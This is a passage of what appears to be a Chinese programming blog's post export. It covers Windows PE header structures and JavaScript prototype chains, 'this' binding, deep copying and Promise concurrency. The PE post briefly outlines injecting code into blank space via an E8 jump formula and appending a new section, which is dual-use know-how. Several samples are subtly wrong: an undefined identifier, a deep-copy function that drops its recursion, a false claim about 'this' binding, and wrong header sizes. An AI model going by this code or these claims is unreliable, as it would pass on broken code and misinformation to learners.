PE","slug":"Windows-PE","date":"2023-05-07T03:11:00.000Z","updated":"2023-12-14T13:17:06.486Z","comments":true,"path":"bd80384e.html","link":"","permalink":"http://example.com/bd80384e.html","excerpt":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构","text":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构 PE 文件结构PE 文件的整体结构PE 结构示例图 PE 文件主要结构PE 文件结构体宽度 结构体 宽度(字节) IMAGE_DOS_HEADER 64 IMAGE_FILE_HEADER 20 INAGE_OPTIONAL_HEADER32 244 IMAGE_SECTION_HEADER 40 PE 文件结构大小示例图 PE文件的两种状态PE文件的两种状态PE文件在运行前（静态，存储在磁盘上）和运行时（动态，运行在内存中）的格式是有差异的，这种差异对于我们理解PE文件是如何执行的来说很重要。我们在之前的文件分析过程中实际上所看到的是静态的内容，其大小是要根据FileAlignment的值进行文件对齐的，但是在运行时则整体按照扩展PE头的成员SectionAlignment的值进行内存对齐，默认情况下该值为0x1000： PE文件的两种状态 DOS头结构体12345678910111213141516171819202122typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 为DOS可执行文件标识符，占用2字节，值为0x5A4De_lfanew 保存了PE头的起始位置 标准PE头12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; _IMAGE_NT_HEADERSSignature: PE标识, 值为0x00004550FileHeader: 文件头OptionalHeader: 扩展头 文件头（标准PE头）123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; _IMAGE_FILE_HEADERMachine: 该字段为WORD类型，占用2字节，该字段标识可执行文件的目标CPU类型NumberOfSections: 该字段为WORD类型，占用2字节，该字段标识PE文件的节区个数TimeDateStamp: 该字段表示编译器填写的时间戳与文件属性中（创建时间、修改时间无关），这个值是自1970年1月1日以来用格林威治时间计算的秒数PointerToSymbolTable: 该字段很少使用，调试相关NumberOfSymbols: 该字段很少使用，调试相关SizeOfOptionalHeader: 该字段为WORD类型，占用2字节；该字段指定IMAGE_OPTIONAL_HEADER结构大小(32位PE文件：0xEO 64位PE文件：0xF0)Characteristics: 该字段为WORD，占用2字节；该字段指定文件属性 Machine 字段取值范围 宏定义 值 意义 IMAGE_FILE_MACHINE_I386 0x014C Intel IMAGE_FILE_MACHINE_ALPHA 0x0184 DEC Alpha IMAGE_FILE_MACHINE_IA64 0x200 Intel(64-bit) IMAGE_FILE_MACHINE_AXP64 0x0284 DEC Alpha(64-bit) IMAGE_FILE_MACHINE_AMD64 0x8664 AMD64 (K8) Characteristics 字段取值范围 数据位 宏定义 值 为1时的含义 0 IMAGE_FILE_RELOCS_STRIPPED 0x0001 文件中不存在重定位信息 1 IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 文件是可执行的 2 IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 不存在行信息 3 IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 不存在符号信息 4 IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 调整工作集 5 IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 应用程序可处理大于2GB的地址 6 此标志位保留 7 IMAGE_FILE_BYTES_REVERSED_LO 0x0080 小尾方式 8 IMAGE_FILE_32BIT_MACHINE 0x0100 只在32平台运行 9 IMAGE_FILE_DEBUG_STRIPPED 0x0200 不包含调试信息 10 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 不能从可移动盘运行 11 IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 不能从网络运行 12 IMAGE_FILE_SYSTEM 0x1000 系统文件（驱动程序），不能直接运行 13 IMAGE_FILE_DLL 0x2000 DLL文件 14 IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 文件不能在多处理器计算机上运行 15 IMAGE_FILE_BYTES_REVERSED_HI 0x8000 大尾方式 Characteristics 计算方式 C++1234例如：01020000 0001 0000 0010下标是1和8位为1；表示文件是一个可执行文件，只在32平台运行 可选头（扩展头）扩展头（32位） C++123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // 32位PE程序：10B 64位PE程序：20B 重要 BYTE MajorLinkerVersion; // 链接器版本号 BYTE MinorLinkerVersion; // 链接器版本号 DWORD SizeOfCode; // 所有代码节的总和，文件对齐后的大小，编译器填的 没用 DWORD SizeOfInitializedData; // 包含所有已经初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD SizeOfUninitializedData; // 包含未初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD AddressOfEntryPoint; // 程序入口 重要 DWORD BaseOfCode; // 代码开始的基址，编译器填的 没用 DWORD BaseOfData; // 数据开始的基址，编译器填的 没用 DWORD ImageBase; // 内存镜像基址 重要 DWORD SectionAlignment; // 内存对齐 重要 DWORD FileAlignment; // 文件对齐 重要 WORD MajorOperatingSystemVersion; // 标识操作系统版本号 主版本号 WORD MinorOperatingSystemVersion; // 标识操作系统版本号 次版本号 WORD MajorImageVersion; // PE文件自身的版本号 WORD MinorImageVersion; // PE文件自身的版本号 WORD MajorSubsystemVersion; // 运行所需子系统版本号 WORD MinorSubsystemVersion; // 运行所需子系统版本号 DWORD Win32VersionValue; // 子系统版本值，必须位0 DWORD SizeOfImage; // 内存中整个PE文件的映射的尺寸，可比实际的值大，必须是SectionAlignment整数倍 重要 DWORD SizeOfHeaders; // 所有头 + 节表按照文件对齐后的大小，否则加载会出错 重要 DWORD CheckSum; // 校验和，一些系统文件有要求用来判断文件是否被修改 重要 WORD Subsystem; // 子系统 驱动程序（1）图形界面（2）控制台、DLL（3） WORD DllCharacteristics; // 文件特性 不是针对DLL文件的 DWORD SizeOfStackReserve; // 初始化时保留的栈大小 DWORD SizeOfStackCommit; // 初始化实际提交的大小 DWORD SizeOfHeapReserve; // 初始化保留的堆大小 DWORD SizeOfHeapCommit; // 初始化实际提交的大小 DWORD LoaderFlags; // 调试相关 DWORD NumberOfRvaAndSizes; // 目录项目数 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 程序真正入口：ImageBase 内存镜像基址 + AddressOfEntryPoint 程序入口 _IMAGE_SECTION_HEADER(节表)123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 空白区域添加代码构造跳转地址公式 要跳转的地址 - E8指令当前的地址 - 5 新增节新增节的步骤判断是否有足够的空间，可以添加一个节表在节表中新增一个成员修改PE头中节的数量修改SizeOfImage的大小在原有数据的最后，新增一个节的数据（内存对齐的整数倍）修正新增节表的属性","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"原型链的应用","slug":"原型链的应用","date":"2023-04-22T02:51:25.000Z","updated":"2023-04-22T16:42:19.311Z","comments":true,"path":"85f7c1f6.html","link":"","permalink":"http://example.com/85f7c1f6.html","excerpt":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]]","text":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]] Object和Function关键点Object.prototype.__proto__ &#x3D; null &#x3D;&gt; 原型链的终点; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype &#x3D;&gt; new Object()Object.__proto__ &#x3D; Function.prototype &#x3D;&gt; new Function()Function.__proto__ &#x3D; Function.prototype &#x3D;&gt; 指向自己, 执行前通过代码注入 instanceof方法instanceofa instanceof Func本质：递归作用：判断 a 是不是 Func 的一个实例 s1.__proto__ &#x3D; Student.prototype -&gt; falseStudent.prototype.__proto__ &#x3D; Object.prototype -&gt; true 1234567891011121314151617181920function Student(name, sex, age, major) &#123; this.name = name; this.sex = sex; this.age = age; this.major = major;&#125;var s1 = new Student(&#x27;jack&#x27;, 18, &#x27;male&#x27;, &#x27;cs&#x27;);var s2 = new Student(&#x27;lucy&#x27;, 20, &#x27;female&#x27;, &#x27;english&#x27;);// 自己封装instanceofObject.myInstanceOf = function(obj, Func) &#123; if(obj === null) return false; if(Object.getPrototypeOf(obj) === Fun.prototype) &#123; return true; &#125;else &#123; return myInstanceOf(Object.getPrototypeOf(obj, Func)); &#125;&#125;// Object.getPrototypeOf() -&gt; 返回对象的隐式原型 数组和类数组数组和类数组的区别本质上是原型链上的区别 1234567891011121314151617181920212223var a = [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;];// 数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: Array.prototype&#125;;// 类数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: xxx&#125;;function demo() &#123; console.log(arguments);&#125;demo(1, 2, 3); 隐式原型的修改隐式原型的修改Object.getPrototypeOf(obj) -&gt; 返回参数对象的隐式原型Object.setPrototypeOf(obj, obj) &#x2F;&#x2F; 不推荐Object.create() &#x2F;&#x2F; 返回一个以obj为隐式原型的值的对象如何得到一个没有任何属性的对象 var o &#x3D; Object.create(null); [[PUT]]&amp;&amp;[[GET]][[PUT]][[PUT]] -&gt; LHS 左查询判断对象中有没有属性如果有, 就找到并返回该地址如果没找到(1) 沿着原型链找A. 找到这个属性(a). 如果是基本类型 -&gt; 覆盖 -&gt; 在对象自身创建这个属性并返回(b). 引用类型：xxx. 对引用类型的引用 -&gt; 覆盖yyy. 对引用类型的访问 -&gt; 修改(2) 没有找到 -&gt; 直到原型链终点 -&gt; 给对象自身创建一个 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var bar = new Object();// 找到该属性并且是基本类型 // bar.prototype.b = 1;// bar.b = 2;// console.log(bar)/** 返回结果: b为基本类型, 会在自身创建属性并返回, 原型链上不变 * bar &#123; * b: 2, * [[prototype]]: Object &#123; * b: 1 * &#125; * &#125; */// 找到该属性并且是引用类型 -- 访问Object.prototype.demo = &#123; m: 1,&#125;// bar.demo.m = 2;// console.log(Object.prototype);/** 返回结果 对引用类型的访问会修改 * Object &#123; * demo: &#123; * m: 2, * &#125; * &#125; */// 找到该属性 -- 对引用类型的引用bar.demo = 2;console.log(bar);/** 返回结果 对引用类型的引用会覆盖 * bar &#123; * demo: 2, * [[prototype]]: Object &#123; * demo: &#123; m: 1 &#125;, * &#125; * &#125; */bar.a = 1 // 会在对象自身创建/** 返回 * bar &#123; * a: 1, * [[prototype]]: Object * &#125; */ 面试题面试题 - 01123456789101112131415161718function A() &#123;&#125;A.prototype.n = 3;A.prototype.add1 = function () &#123; this.n++; // this.n = this.n + 1 RHS [[GET]] // 左边this.n =&gt; LHS -&gt; [[PUT]] =&gt; 基本类型(自身创建覆盖) =&gt; A &#123; n: 4 &#125;&#125;var a = new A();var b = new A();var c = new A()a.add1();/** 分析 通过点(.)的方式调用函数会绑定this * (1). a.add1 -&gt; 属于RHS: 读操作，获取a.add1的返回值 * (2). RHS -&gt; [[GET]] -&gt; a.[[__proto__]] -&gt; A.prototype.[[__proto__]] */b.add1();console.log(a.n, b.n, c.n); // 4, 4, 3 面试题 - 021234567891011function A () &#123;&#125;;A.prototype.m = &#123; t: 1,&#125;;A.prototype.add2 = function() &#123; this.m = &#123;&#125;; // 写操作 =&gt; 对引用对象的引用 =&gt; 覆盖 =&gt; d &#123; m: &#123;&#125;, prototype: Object &#123; add2: f(), m: &#123;t: 1&#125;&#125;&#125; // LHS -&gt; [[PUT]]&#125;var d = new A();d.add2(); // RHS =&gt; [[GET]] -&gt; d.[[__proto__]] -&gt; A.prototypeconsole.log(d.m.t); // undefined 面试题 - 03123456789101112131415161718function Person(name, age) &#123; this.name = name; this.age = age; this.eat = function() &#123; console.log(age + &quot;岁的&quot; + name + &quot;在吃饭.&quot;); &#125;;&#125;Person.run = function() &#123;&#125;;Person.prototype.walk = function () &#123;&#125;;let p1 = new Person(&#x27;jsliang&#x27;, 24);let p2 = new Person(&#x27;jsliang&#x27;, 24);// 对象的引用的值判断 -&gt; 判断地址console.log(p1.eat === p2.eat); // false =&gt; new的时候指向不同的地址console.log(p1.run === p2.run); // trueconsole.log(p1.walk === p2.walk); // true 面试题 - 04123456789101112function foo() &#123; this.some = &#x27;222&#x27;; // 能访问到 let ccc = &#x27;ccc&#x27;; foo.obkorou1= &#x27;obkorou1&#x27;; foo.prototype.a = &#x27;aaa&#x27;; // 能访问到&#125;foo.koro = &#x27;扣肉&#x27;;foo.prototype.test = &#x27;test&#x27; // 被修改let foo1 = new foo();foo.prototype.test = &#x27;test2&#x27;; // 能访问到// foo1 访问到哪些属性?","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"原型链","slug":"原型链","date":"2023-04-16T13:12:07.000Z","updated":"2023-04-22T09:17:05.792Z","comments":true,"path":"bf8cf30.html","link":"","permalink":"http://example.com/bf8cf30.html","excerpt":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读）","text":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读） new的执行流程123456function foo() &#123; console.log(1);&#125;const a = new foo(); // 第二步用代码表示：this.__proto__ = foo.prototype； 返回值：this指向的对象的引用console.log(a); new的执行流程绑定this为空对象让空对象[[Prototype]](__protot__) –&gt; 函数的prototype属性 (1) 所有对象都有[[Prototype]](隐式属性 __protot__) -&gt; 所有对象本质上都是new出来的 (2) 所有的函数对象 -&gt; prototype正常执行函数如果函数返回的基本类型，返回this的值，否则返回原函数的返回值 new执行流程图解 [[GET]]1234567function foo() &#123; console.log(1);&#125;const a = new foo(); a.b // 不报错返回undefinedconsole.log(a.b) // 访问对象属性的本质，底层帮调用 [[GET]]流程判断对象里面有没有判断它的__proto__指向的对象里面有没有 面试题123456789101112131415Object.prototype.a = function () &#123; console.log(&#x27;a&#x27;);&#125;;Function.prototype.b = function () &#123; console.log(&#x27;b&#x27;);&#125;;var F = new function() &#123; &#125;;var f = new F();console.log(f.a) // 打印aconsole.log(f.a) // 打印undefinedconsole.log(F.a) // 打印aconsole.log(F.b) // 打印b 原型链面试题图解 原型链的终点是：Object.prototype.[[prototype]] &#x3D; nullObject.prototype.__proto__ &#x3D; null; &#x2F;&#x2F; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype; &#x2F;&#x2F; new Object()Object.__proto__ &#x3D; Function.prototype; &#x2F;&#x2F; new Funtion()Function.__proto__ &#x3D; Function.prototype","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"变量","slug":"变量","date":"2023-04-16T02:18:20.000Z","updated":"2023-04-16T12:53:28.963Z","comments":true,"path":"13ffbe88.html","link":"","permalink":"http://example.com/13ffbe88.html","excerpt":"变量的本质深拷贝垃圾回收","text":"变量的本质深拷贝垃圾回收 变量的本质栈(stack)的特性结构性强，内存连续寻址速度快数据稳定容量小 原始类型原始类型存于栈中原始类型不可修改; 无法直接修改指向内存中的值, 需要新开辟一块内存类型typeof返回值对象包装器Null“object”N&#x2F;AUndefined“undefined”N&#x2F;ABoolean“boolean”BooleanNumber“number”NumberBigInt“bigint”BigIntString“string”StringSymbol“symbol”Symbol 堆(heap)的特性类似于书架存储以坨为单位容量大不同数据间内存不连续 引用类型在js中引用类型指的是对象（Object）; 示例代码-011234567891011121314var b1 = 1, b2 = b1; // RHS right head-side search 右查询（本质：读了内存中存的值）b2 = b1; // 本质是在内存中指向了新的数据（2），旧数据（1）将被回收console.log(b1, b2);var r1 = &#123; a: 1, &#125;, r2 = r1; // 程序本身只允许访问栈，无法访问堆；栈和堆通过标识符建立连接r2.a = 2; // 因为r1和r2同时指向了堆中的数据，所以修改r2，r1随之改变console.log(r1.a, r2.a) 字符串(特殊)字符串本质上是存放在堆中，但是它是一个原始类型，原始类型不能直接修改栈中的数据，而是新建了一个标识符并指向了堆中的新数据 示例代码-021234var a = &#x27;hello word&#x27;, b = a;b = &#x27;hello&#x27;; // 栈中会新建标识符指向新数据，旧数据则被回收consoel.log(a, b); 变量总结知识总结数据组织的方式不同 – 栈中的内存是连续的，堆中不是用户权限不同 – 用户能读取栈中的数据不能读取堆中的数据大小不同 – 栈的空间小堆的空间大寻址速度不同 – 栈的寻址速度快而堆的寻址速度慢作用不同 – 栈中存的是基本类型、引用类型的标识符以及字符串的标识符；堆中存放大小不确定的数据 值传递和引用传递所谓的引用传递取决于传递的是值还是地址；在javascript中本质上就是值传递（读栈stack内存中的值） 示例代码-01123456789101112131415function change1(arg) &#123; arg = 200;&#125;function change2(arg)&#123; arg.a = 200;&#125;var foo = 100;var bar = &#123; a: 100 &#125;;change1(foo);change2(bar);console.log(foo, bar); 深拷贝&amp;浅拷贝代码示例1234567891011121314151617181920212223242526272829303132333435363738394041var person1 = &#123; age: 28, hobby: &#x27;学习&#x27;, son: &#123; age: 3, hobby: &#x27;drink milk&#x27;, friends: [&#x27;jack&#x27;, &#x27;lucy&#x27;], &#125;,&#125;// 浅拷贝function clone2(obj) &#123; var clonePerson = &#123;&#125;; for(var key in obj) &#123; clonePerson[key] = obj[key]; &#125; return clonePerson;&#125;var newPerson = clonePerson(person1);newPerson.age = 18;console.log(person1.age);newPerson.son.age = 100; // 会改变，son是一个object属于引用类型存放于堆中，newPerson.son和person1.son指向同一个console.log(newPerson.son.age);// 利用递归实现深拷贝function clone2(obj) &#123; if(typeof obj !== &#x27;object&#x27; || obj === null) &#123; return obj; &#125; var clone = Array.isArray(obj) ? [] : &#123;&#125;; for(var key in obj) &#123; if(typeof obj[key] === &#x27;object&#x27;) &#123; clone2(obj[key]) &#125;else &#123; clone[key] = obj[key]; &#125; &#125; return clone;&#125; 垃圾回收stack存储基本变量和引用类型的指向;heap存储复杂数据和字符串;stack会自动回收,heap借助垃圾回收机制进行回收，但需要一定的手动操作; 视频地址变量的本质&深拷贝&垃圾回收https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Promise异步任务并发","slug":"Promise异步任务并发","date":"2023-04-05T05:23:21.000Z","updated":"2023-04-16T12:54:15.168Z","comments":true,"path":"5d76cec.html","link":"","permalink":"http://example.com/5d76cec.html","excerpt":"背景设计一个方法doSomething来限制异步任务的最大并发数","text":"背景设计一个方法doSomething来限制异步任务的最大并发数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function sleep (timeout: number, taskName: string) &#123; return new Promise&lt;void&gt;(resolve =&gt; &#123; console.log(`$&#123;taskName&#125;开始啦`); setTimeout(() =&gt; &#123; console.log(`$&#123;taskName&#125;结束啦`); resolve(); &#125;, timeout) &#125;);&#125;const tasks = [ () =&gt; sleep(1000, &#x27;睡觉&#x27;), () =&gt; sleep(2000, &#x27;吃饭&#x27;), () =&gt; sleep(3000, &#x27;打游戏&#x27;), () =&gt; sleep(5000, &#x27;写代码&#x27;), () =&gt; sleep(7000, &#x27;做运动&#x27;),];async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); taskPool.add(promise); promise.then(() =&gt; taskPool.delete(promise)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125;/** 如果存在同步任务情况async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); const p = Promise.resolve(promise) // 包装Promise, 同步任务直接返回 taskPool.add(p); promise.then(() =&gt; taskPool.delete(p)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125; */doSomethin(tasks).then(() =&gt; &#123; console.log(&#x27;任务全部执行完了&#x27;);&#125;)// 加载图片function getTasks(urls) &#123; const tasks = []; urls.forEach(url =&gt; &#123; tasks.push(() =&gt; &#123; new Promise(resolve =&gt; &#123; const img = new Image(); img.onload = () =&gt; &#123; resolve(); &#125; img.src = url; &#125;) &#125;) &#125;) return tasks;&#125;doSomething(getTasks([&#x27;xxxx.jpg&#x27;, &#x27;xxxx.png&#x27;])).then(() =&gt; &#123; console.log(&#x27;全部执行完了&#x27;);&#125;)// 加载图片 视频地址【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"async/await 学习","slug":"async-await","date":"2023-04-04T14:40:36.000Z","updated":"2023-04-04T15:26:12.522Z","comments":true,"path":"ca9ee217.html","link":"","permalink":"http://example.com/ca9ee217.html","excerpt":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。","text":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。 备注await关键字只在 async 函数内有效。如果你在 async 函数体之外使用它，就会抛出语法错误 SyntaxError。 备注async&#x2F;await的目的为了简化使用基于 promise 的 API 时所需的语法。async&#x2F;await 的行为就好像搭配使用了生成器和 promise。 示例12345678910111213141516171819202122232425262728293031323334353637let count = 0;function request (url) &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(url + count ++); &#125;, 500); &#125;);&#125;// 使用async/await语法糖// async function run () &#123;// const res1 = await request(&#x27;1111&#x27;);// const res2 = await request(res1);// console.log(res2);// &#125;// run();// 基于生成器函数模拟async/awaitfunction* generate() &#123; const res = yield request(&#x27;1111&#x27;); const res2 = yield request(res); console.log(res2);&#125;// 使用递归实现连续调用function run () &#123; const g = generate(); function exec (params) &#123; const &#123; value, done &#125; = g.next(); if (!done) &#123; value.then(res =&gt; exec(res)); &#125; &#125; exec();&#125;run();","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"this 指向","slug":"this指向学习","date":"2023-04-01T12:15:04.000Z","updated":"2023-04-03T16:09:03.414Z","comments":true,"path":"6cfe1ad3.html","link":"","permalink":"http://example.com/6cfe1ad3.html","excerpt":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的","text":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的 this 绑定规则this的绑定规则绑定一：默认绑定绑定二：隐式绑定绑定三：显示绑定绑定四：new绑定 默认绑定独立的函数调用可以理解成函数没有被绑定到某个对象上进行调用 严格模式，独立调用的函数中的this指向的是undefined 12345678910111213141516171819202122// 1. 普通函数被独立调用function foo () &#123; console.log(&#x27;foo &#x27;, this);&#125;;foo(); // 指向window// 2. 函数定义在对象中，但是独立调用const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(&#x27;bar &#x27;, this); &#125;,&#125;;// obj.bar(); // 指向obj对象const baz = obj.bar;baz() // 指向window// 3. 严格模式，独立调用的函数中的this指向的是undefined 案例案例一12345function () &#123; console.log(this);&#125;foo() 案例二123456789101112131415function test1 () &#123; console.log(this); test2();&#125;function test2 () &#123; console.log(this); test3();&#125;function test3 () &#123; console.log(this);&#125;test1(); 案例三12345678910111213// 高阶函数function foo (func) &#123; func()&#125;const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(this); &#125;&#125;foo(obj.bar); // 属于独立调用 隐式绑定通过某个对象进行调用；也就是它的调用位置中，是通过某个对象发起的函数调用 隐式绑定的前提条件必须在调用的对象内部有一个对函数的引用（比如一个属性）；如果没有这样的引用，在进行调用时，会报找不到该函数的错误；正是通过这样的引用，间接的将this绑定到这个对象上； 1234567891011// 隐式绑定function foo () &#123; console.log(this);&#125;const obj = &#123; bar: foo,&#125;obj.bar(); // 指向obj对象 案例案例一123456789101112131415function foo () &#123; console.log(this);&#125; const obj = &#123; name: &#x27;obj&#x27;, foo: foo, &#125; const obj2 = &#123; name: &#x27;obj2&#x27;, obj1: obj2, &#125; obj2.obj1.foo(); // 指向obj1对象 案例21234567891011function foo () &#123; console.log(this);&#125;const obj1 = &#123; name: &#x27;obj1&#x27;, foo: foo,&#125;const bar = obj1.foo;bar(); // 指向obj1对象 显式绑定不希望在对象内部包含这个函数的引用，同时又希望在这个对象上进行强制调用；可以使用显式绑定 call和apply方法第一个参数是相同的，要求传入一个对象这个对象的作用就是给this准备的在调用这个函数时，会将this绑定到这个传入的对象上后面的参数；apply为数组，call为参数列表 1234567891011121314151617function foo (name, age, height) &#123; console.log(&#x27;foo 函数被调用 &#x27;, this); console.log(&#x27;打印参数 &#x27;, name, age, height);&#125;// ()调用// foo(&#x27;why&#x27;, 18, 180);// apply// 第一个参数：绑定this// 第二个参数：传入额外的实参，以数组的形式// foo.apply(&#x27;apply&#x27;, [&#x27;kobe&#x27;, 30, 198])// call// 第一个参数：绑定this// 第二个参数：后续的参数以多参数的形式传递，会作为实参foo.call(&#x27;call&#x27;, &#x27;james&#x27;, 35, 205); bind 的显示绑定如果我们希望一个函数总是显式的绑定到一个对象上，可以使用 bind 方法；bind()方法创建一个新的绑定函数(bound function, BF)绑定函数是一个exotic function object(怪异函数对象，ECMAScript 2015 中的术语)在bind() 被调用时，这个新函数的this被指定为bind() 的第一个参数，而其余参数将作为新函数的参数，供调用时使用 1234567891011121314function foo (name, age, height) &#123; console.log(&#x27;foo &#x27;, this);&#125;const obj = &#123; &#x27;name&#x27;: &#x27;why&#x27; &#125;;// 需求：调用foo时，总是绑定到obj对象身上（不希望obj对象上有函数）// 1. bind函数的基本使用const bar = foo.bind(obj);bar(); // this --&gt; obj// 2. bind函数的其他参数const test = foo.bind(obj, &#x27;kobe&#x27;, 30, 198)test() new绑定JavaScript中的函数可以当做一个类的构造函数来使用，也就是使用new关键字 使用new关键字调用函数执行的操作创建新的空对象；新对象会被执行prototype连接；新对象会绑定到函数调用的this上（this绑定在这个步骤完成）；没有显示返回非空对象时，默认返回这个对象； 123456789101112131415function foo () &#123; this.name = &#x27;why&#x27;; console.log(this);&#125;new foo(); // 指向foo对象// 创建Personfunction Person (name) &#123; console.log(this); // Person &#123;&#125; this.name = name; // Person &#123; name: &#x27;why&#x27; &#125;&#125;const p = new 